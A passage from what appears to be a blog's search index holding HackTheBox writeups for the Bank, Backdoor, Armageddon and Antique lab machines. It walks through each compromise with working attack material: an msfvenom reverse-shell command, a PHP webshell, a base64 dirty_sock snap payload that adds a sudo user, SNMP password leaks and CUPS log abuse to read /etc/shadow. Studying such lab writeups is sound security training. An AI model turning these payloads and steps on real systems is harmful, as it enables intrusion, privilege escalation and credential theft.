(@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://bank.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php[+] Timeout: 10s===============================================================2022/01/25 20:46:06 Starting gobuster in directory enumeration mode===============================================================/index.php (Status: 302) [Size: 7322] [--&amp;gt; login.php]/login.php (Status: 200) [Size: 1974] /support.php (Status: 302) [Size: 3291] [--&amp;gt; login.php]/uploads (Status: 301) [Size: 305] [--&amp;gt; http://bank.htb/uploads/]/assets (Status: 301) [Size: 304] [--&amp;gt; http://bank.htb/assets/] /logout.php (Status: 302) [Size: 0] [--&amp;gt; index.php] /inc (Status: 301) [Size: 301] [--&amp;gt; http://bank.htb/inc/] /server-status (Status: 403) [Size: 288] /balance-transfer (Status: 301) [Size: 314] [--&amp;gt; http://bank.htb/balance-transfer/] =============================================================== 2022/01/25 21:26:59 Finished ===============================================================Entering the /balance-transfer dir we find a lot of files. All have the same size, except for one which is much smaller:Contents of the file can be found below:--ERR ENCRYPT FAILED+=================+| HTB Bank Report |+=================+===UserAccount===Full Name: Christos ChristopoulosEmail: chris@bank.htbPassword: !##HTBB4nkP4ssw0rd!##CreditCards: 5Transactions: 39Balance: 8842803 .===UserAccount===Using the credentials to login, we can access a page where we can upload a file. If we view the source code we can see that the developer left a comment saying that any file endning in .htb will be executed as php for debugging purposes.Uploading a standard php reverse shell and renaming it to something ending in .htb will give a reverse shell when trying to access it after uploading it via the ticket functionality.Clicking on the ticket will execute the php code.Privilege escalationReceiving the reverse shell, we start out by looking at SUID binaries:┌──(bitis㉿workstation)-[~/htb/Machines/banking]└─$ nc -lvnp 1337listening on [any] 1337 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.29.200] 44466Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 i686 i686 GNU/Linux 18:14:04 up 22 min, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#39;t access tty; job control turned off$ find / -perm -4000 2&amp;gt;/dev/null/var/htb/bin/emergency/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysignOne stands out immediatly, namely the file /var/htb/bin/emergencySimply running it gives us root access. Rooted!" }, { "title": "Backdoor writeup", "url": "/posts/Backdoor/", "categories": "Writeup, HackTheBox", "tags": "Easy-box", "date": "2022-06-17 14:00:00 +0200", "snippet": "SummaryThis box includes a unique way of enumerating a machine through an LFI by fuzzing for a specific PID that spawned a service on port 1337. At least I hadn’t seen it before trying it. The privesc step however is rather straight forward.FootholdLet’s start of with an nmap scan.# Nmap 7.92 scan initiated Sat Nov 20 14:36:07 2021 as: nmap -sC -sV --open -p- -oA nmap_scans/scan_full 10.129.102.115Nmap scan report for 10.129.102.115Host is up (0.071s latency).Not shown: 62690 closed tcp ports (conn-refused), 2842 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;amp;#8211; Real-Life|_http-generator: WordPress 5.8.11337/tcp open waste?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Nov 20 14:36:55 2021 -- 1 IP address (1 host up) scanned in 48.52 secondsBased on the nmap scan we can conclude that it is using Wordpress. Since this is a wordpress site it is usually a good idea to check which plugins are used. this can be done by checking the /wp-content/plugins directory. We quickly learn that a plugin named ebook-download 1.1 is installed. Searching for exploits related to this leads to the following poc on exploit-db:https://www.exploit-db.com/exploits/39575It’s a very simple poc. Basically we can use the ebook-download plugin to download local files from the server granting us LFI.Before we continue it might be a good idea to learn what service is running on port 1337. I wrote a very simple scriptimport requeststarget = &#39;/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{}/cmdline&#39;url = &#39;http://10.129.107.129&#39;for i in range(1000): r = requests.get(url + target.format(i)) result = r.text.split(&quot;cmdline&quot;)[3].split(&quot;&amp;lt;script&amp;gt;&quot;)[0] if result == &#39;&#39;: continue else: print(r.text.split(&quot;cmdline&quot;)[3].split(&quot;&amp;lt;script&amp;gt;&quot;)[0] + &#39;\\n&#39;)The script simply automates the process of getting the cmdline which initiated the process associated with the pid in the url. We don’t know what pids are found in the /proc folder on the target system, so I just used a for-loop and printed all non-empty results.Running this script gives us the following results (among others):/bin/sh-cwhile true;do su user -c &quot;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&quot;; doneBased on this it seems that there is a gdb server on port 1337To exploit this we can create a reverse shell by using msfvenom: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o rev.elfwe can then connect to the gdb server by using gdb:gdbtarget extended-remote IP:PORTremote put rev.elf rev.elfset remote exec-file /home/user/rev.elfshow remote exec-filerunThe above commands start by connecting to the GDB server. After this the rev.elf file is sent to the server with the same name. The file is then chosen to be run and then executed. When the file is run we of course get a reverse shell on the target system.To get a more stable shell we simply use wget to get the id_rsa.pub file from our own system. We then rename this file to authorized_keys on the target system and connect via ssh:Privilege escalationWe start out by finding SUID binaries.user@Backdoor:~$ find / -perm -4000 2&amp;gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/at/usr/bin/su/usr/bin/sudo/usr/bin/newgrp/usr/bin/fusermount/usr/bin/screen/usr/bin/umount/usr/bin/mount/usr/bin/chsh/usr/bin/pkexecscreen is set as a SUID binary.ser@Backdoor:~$ ls -laR /var/run/screen/var/run/screen:total 0drwxr-xr-x 4 root utmp 80 Jun 13 14:43 .drwxr-xr-x 25 root root 760 Jun 13 14:40 ..drwx------ 2 root root 60 Jun 13 14:04 S-rootdrwx------ 2 user user 40 Jun 13 14:43 S-userls: cannot open directory &#39;/var/run/screen/S-root&#39;: Permission deniedBased on this output there is a screen session running as root. To switch to this session we can use the -x flag:screen -x root/rootand rooted!" }, { "title": "Armageddon writeup", "url": "/posts/Armageddon/", "categories": "Writeup, HackTheBox", "tags": "Easy-box", "date": "2022-06-17 13:00:00 +0200", "snippet": "SummaryThis box focuses on exploiting the drupalgeddon vulnerability to achieve a web-shell. After this some database enumeration is required to obtain ssh credentials. After this, snap is used to install a malicious package which creates a user with root privileges. (POC found here)FootholdWe start with an nmap scan to see what services are available on the machine.# Nmap 7.92 scan initiated Fri Jan 21 19:28:01 2022 as: nmap -sC -sV -p- -o nmap/full.txt 10.129.48.89Nmap scan report for 10.129.48.89Host is up (0.051s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)| 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-title: Welcome to Armageddon | Armageddon|_http-generator: Drupal 7 (http://drupal.org)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Jan 21 19:28:22 2022 -- 1 IP address (1 host up) scanned in 21.74 secondsAs we can see, nmap discovered that the webserver hosts a robots.txt file. One of the directories that the file is disallowing is CHANGELOG.txt. Let’s take a look:Drupal 7.56, 2017-06-21------------------------ Fixed security issues (access bypass). See SA-CORE-2017-003.Drupal 7.55, 2017-06-07------------------------ Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate DATE_RFC7231 definition.- Made Drupal core pass all automated tests on PHP 7.1.- Allowed services such as Let&#39;s Encrypt to work with Drupal on Apache, by making Drupal&#39;s .htaccess file allow access to the .well-known directory defined by RFC 5785.- Made new Drupal sites work correctly on Apache 2.4 when the mod_access_compat Apache module is disabled.- Fixed Drupal&#39;s URL-generating functions to always encode &#39;[&#39; and &#39;]&#39; so that the URLs will pass HTML5 validation.- Various additional bug fixes.- Various API documentation improvements.- Additional automated test coverage.Drupal 7.54, 2017-02-01-----------------------(...)The webserver also says “powered by Armageddon”. Searching for Armageddon exploit quickly returns the following poc: https://github.com/dreadlocked/Drupalgeddon2The poc works for versions of Drupal below 7.58, and based on the changelog the target system is using drupal v7.56cloning the repository and then running the poc gives us a webshell!──(bitis㉿workstation)-[~/htb/Machines/Armageddon/Drupalgeddon2]└─$ ./drupalgeddon2.rb http://10.129.48.89[*] --==[::#Drupalggedon2::]==----------------------------------------------------------------------------------[i] Target : http://10.129.48.89/--------------------------------------------------------------------------------[+] Found : http://10.129.48.89/CHANGELOG.txt (HTTP Response: 200)[+] Drupal!: v7.56--------------------------------------------------------------------------------[*] Testing: Form (user/password)[+] Result : Form valid- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Clean URLs[!] Result : Clean URLs disabled (HTTP Response: 404)[i] Isn&#39;t an issue for Drupal v7.x--------------------------------------------------------------------------------[*] Testing: Code Execution (Method: name)[i] Payload: echo SORLROQT[+] Result : SORLROQT[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!--------------------------------------------------------------------------------[*] Testing: Existing file (http://10.129.48.89/shell.php)[i] Response: HTTP 404 // Size: 5- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Writing To Web Root (./)[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php[+] Result : &amp;lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) { system( $_REQUEST[&#39;c&#39;] . &#39; 2&amp;gt;&amp;amp;1&#39; ); }[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!--------------------------------------------------------------------------------[i] Fake PHP shell: curl &#39;http://10.129.48.89/shell.php&#39; -d &#39;c=hostname&#39;armageddon.htb&amp;gt;&amp;gt; However we have only gained access as the apache user. To gain access to a proper user we need to do some enumeration:armageddon.htb&amp;gt;&amp;gt; iduid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0armageddon.htb&amp;gt;&amp;gt; pwd/var/www/htmlarmageddon.htb&amp;gt;&amp;gt; ls -altotal 288drwxr-xr-x. 9 apache apache 4096 Jun 11 23:16 .drwxr-xr-x. 4 root root 33 Dec 3 2020 ..-rw-r--r--. 1 apache apache 317 Jun 21 2017 .editorconfig-rw-r--r--. 1 apache apache 174 Jun 21 2017 .gitignore-rw-r--r--. 1 apache apache 6112 Jun 21 2017 .htaccess-rw-r--r--. 1 apache apache 111613 Jun 21 2017 CHANGELOG.txt-rw-r--r--. 1 apache apache 1481 Jun 21 2017 COPYRIGHT.txt-rw-r--r--. 1 apache apache 1717 Jun 21 2017 INSTALL.mysql.txt-rw-r--r--. 1 apache apache 1874 Jun 21 2017 INSTALL.pgsql.txt-rw-r--r--. 1 apache apache 1298 Jun 21 2017 INSTALL.sqlite.txt-rw-r--r--. 1 apache apache 17995 Jun 21 2017 INSTALL.txt-rw-r--r--. 1 apache apache 18092 Nov 16 2016 LICENSE.txt-rw-r--r--. 1 apache apache 8710 Jun 21 2017 MAINTAINERS.txt-rw-r--r--. 1 apache apache 5382 Jun 21 2017 README.txt-rw-r--r--. 1 apache apache 10123 Jun 21 2017 UPGRADE.txt-rw-r--r--. 1 apache apache 6604 Jun 21 2017 authorize.php-rw-r--r--. 1 apache apache 720 Jun 21 2017 cron.phpdrwxr-xr-x. 4 apache apache 4096 Jun 21 2017 includes-rw-r--r--. 1 apache apache 529 Jun 21 2017 index.php-rw-r--r--. 1 apache apache 703 Jun 21 2017 install.phpdrwxr-xr-x. 4 apache apache 4096 Dec 4 2020 miscdrwxr-xr-x. 42 apache apache 4096 Jun 21 2017 modulesdrwxr-xr-x. 5 apache apache 70 Jun 21 2017 profiles-rw-r--r--. 1 apache apache 2189 Jun 21 2017 robots.txtdrwxr-xr-x. 2 apache apache 261 Jun 21 2017 scripts-rw-r--r--. 1 apache apache 75 Jun 11 23:16 shell.phpdrwxr-xr-x. 4 apache apache 75 Jun 21 2017 sitesdrwxr-xr-x. 7 apache apache 94 Jun 21 2017 themes-rw-r--r--. 1 apache apache 19986 Jun 21 2017 update.php-rw-r--r--. 1 apache apache 2200 Jun 21 2017 web.config-rw-r--r--. 1 apache apache 417 Jun 21 2017 xmlrpc.phparmageddon.htb&amp;gt;&amp;gt;reading the file /var/www/html/sites/default/settings.php reveals the following:$databases = array ( &#39;default&#39; =&amp;gt; array ( &#39;default&#39; =&amp;gt; array ( &#39;database&#39; =&amp;gt; &#39;drupal&#39;, &#39;username&#39; =&amp;gt; &#39;drupaluser&#39;, &#39;password&#39; =&amp;gt; &#39;CQHEy@9M*m23gBVj&#39;, &#39;host&#39; =&amp;gt; &#39;localhost&#39;, &#39;port&#39; =&amp;gt; &#39;&#39;, &#39;driver&#39; =&amp;gt; &#39;mysql&#39;, &#39;prefix&#39; =&amp;gt; &#39;&#39;, ), ),);we now have a user and password for the mysql database hosted on the system. We can still use the webshell given by the poc to perform commands, which we will use to enumerate the database.We run the following command in the webshell:armageddon.htb&amp;gt;&amp;gt; mysql -e &quot;select * from users;&quot; -u drupaluser -p&quot;CQHEy@9M*m23gBVj&quot; drupalwhich returns the following entry: 1 brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu cracking the hash via hashcat gives us the credentials:brucetherealadmin:boobooWe can then login via sshPrivilege escalationrunning sudo -l as bruce:[brucetherealadmin@armageddon ~]$ sudo -lMatching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install *seems that we can use snap to install any package that we want.I found the following exploit online, which when used creates a user dirty_sock:dirty_sock that can run sudo -i https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1More details on the exploit can be found hereThe basic idea is that snapd serves a REST API via a unix socket on the system. When connecting to the socket, the connection contains a string delimited by semi-colons which contains the uid of the user making the connection. however if an attacker can control this string they can append another uid. A for loop will split the string by the delimiter, and then check each split for the uid, allowing the second uid to overwrite the real uid. This allows an attacker to fake a connection made by uid=0. This gives the attacker access to any API function, which can lead to root access. I use the dirty_sockv2 exploit, which uses this functionality to run a bash script as root creating another user named dirty_sock and adding it to the sudoers file.[brucetherealadmin@armageddon ~]$ python -c &#39;print(&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; + &quot;A&quot; * 4256 + &quot;==&quot;)&#39; | base64 -d &amp;gt; payload.snap[brucetherealadmin@armageddon ~]$ lspayload.snap user.txt[brucetherealadmin@armageddon ~]$ sudo snap install payload.snap --dangerous --devmodedirty-sock 0.1 installed[brucetherealadmin@armageddon ~]$ su dirty_sockPassword: [dirty_sock@armageddon brucetherealadmin]$ sudo -iWe trust you have received the usual lecture from the local SystemAdministrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility.[sudo] password for dirty_sock: [root@armageddon ~]# rooted!Small side note: I guess since we could run snap as sudo, the whole overwriting of the uid didn’t really matter as long as we had an evil snap package." }, { "title": "Antique writeup", "url": "/posts/Antique/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, chisel, printer", "date": "2022-06-17 12:00:00 +0200", "snippet": "SummaryThis box is centered around exploiting a misconfigured HP JetDirect printer via snmp. It also covers port forwarding an exploiting the CUPS service, which is a modular printing service for Unix-like computer systems. Let’s take a look!Footholdstarting an nmap scan, we see a telnet service on port 23. It says something about HP jetdirect when trying to connect to it via telnet.we also do a UDP scan on the address, with the -sU tag. This takes a whileThe only port open and unfiltered besides telnet is 161/udp:# Nmap 7.92 scan initiated Sat Jun 11 00:39:54 2022 as: nmap -sU -sC -sV -o nmap/udp.txt 10.129.71.148Nmap scan report for 10.129.71.148Host is up (0.025s latency).Not shown: 997 closed udp ports (port-unreach)PORT STATE SERVICE VERSION68/udp open|filtered dhcpc161/udp open snmp SNMPv1 server (public)40441/udp open|filtered unknownService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Jun 11 00:59:53 2022 -- 1 IP address (1 host up) scanned in 1198.94 secondsrunning snmpwalk -v 1 -c public $IP reveals its a printer named HTB Printer. Since the only available entrypoint seems to be this printer, we better find out how to exploit it. This blogpost goes into a lot of detail on how exploit a HP jetdicrect printer which has not been configured correctly. Basically, if the right string is sent to the printer it will respond with its own password.This can be exploited with the following command:snmpwalk -v 1 -c public .1.3.6.1.4.1.11.2.3.9.1.1.13.0This returns some hexcodes. decoding this shows a password:P@ssw0rd@123!!123Log in to the telnet service with this passwordOnce logged in to the telnet service, the exec id command can be used to find who we are connected as. We can see that we are the user lp, within the lpadmin group. To get a reverse shell, simply prepend exec to any reverse shell payload you want to use. Most should work.userflag:f48580e6c8557d0426e3413517504121Privilege escalationwe run ss --tulnp and get the following:lp@antique:~$ ss -tulnpss -tulnpNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* udp UNCONN 0 0 0.0.0.0:161 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:23 0.0.0.0:* users:((&quot;python3&quot;,pid=1150,fd=3)) tcp LISTEN 0 4096 127.0.0.1:631 0.0.0.0:* tcp LISTEN 0 4096 [::1]:631 [::]:* lp@antique:~$ the interesting part of this output is that the machine is listening on port 631 since this port did not show up on our scans.I will use chisel to set up a listening port on my machine which i can then use to communicate with port 631 on the target machineon the attacker machine we run the following command: ./chisel server --reverse -p 8000on the victim machine: ./chisel client 10.10.17.182:8000 R:8001:127.0.0.1:631output of chisel server once connection has been esablished:./chisel server --reverse -p 80002022/06/11 01:27:02 server: Reverse tunnelling enabled2022/06/11 01:27:02 server: Fingerprint gV7xDnh1btaUqoCrX8/mA9qgIZzsnrA2m1TEsRKLmO0=2022/06/11 01:27:02 server: Listening on http://0.0.0.0:80002022/06/11 01:30:19 server: session#1: tun: proxy#R:8001=&amp;gt;631: Listeningwhen visiting localhost:8001 in our browser we get greeted with the following pagesearching for exploits in cups 1.6.1 leads us to the following link https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/We can read files as root through the error log page on cups through the error log path.To change the path we need to use cupsctl. See belowp@antique:~$ cupsctl &#39;ErrorLog&#39;=/etc/shadowcupsctl &#39;ErrorLog&#39;=/etc/shadowlp@antique:~$ curl http://localhost:631/admin/log/error_log?curl http://localhost:631/admin/log/error_log? % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 999 100 999 0 0 975k 0 --:--:-- --:--:-- --:--:-- 975kroot:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::daemon:*:18375:0:99999:7:::---SNIP---pollinate:*:18375:0:99999:7:::systemd-coredump:!!:18389::::::lxd:!:18389::::::usbmux:*:18891:0:99999:7:::We can of course crack the root hash and login as root, however we can also just change the error log path to /root/root.txt and read the root flag:lp@antique:~$ cupsctl &quot;ErrorLog&quot;=/root/root.txtcupsctl &quot;ErrorLog&quot;=/root/root.txtlp@antique:~$ curl http://localhost:631/admin/log/error_log?curl http://localhost:631/admin/log/error_log? % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 33 100 33 0 0 33000 0 --:--:-- --:--:-- --:--:-- 3300041a5b5db9f352acb5da454924de84bealp@antique:~$ " } ]
